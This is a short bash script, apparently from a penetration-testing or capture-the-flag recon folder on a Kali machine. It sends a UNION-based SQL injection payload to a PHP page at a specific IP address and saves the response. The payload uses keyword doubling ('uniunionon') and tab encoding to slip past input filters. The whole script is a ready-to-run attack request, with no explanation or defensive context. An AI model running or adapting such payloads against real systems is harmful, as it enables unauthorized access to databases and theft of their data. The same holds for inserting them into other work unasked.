#!/bin/bash
# Test union injection
curl -s "http://8.140.206.93:81/vulnerabilities/fu1.php?id=-1')%09uniunionon%09select%091,2,3,4,5%23" > /home/kali/桌面/hack/8.140.206.93/recon/union-test.html
echo "Done. Size: $(wc -c < /home/kali/桌面/hack/8.140.206.93/recon/union-test.html)"
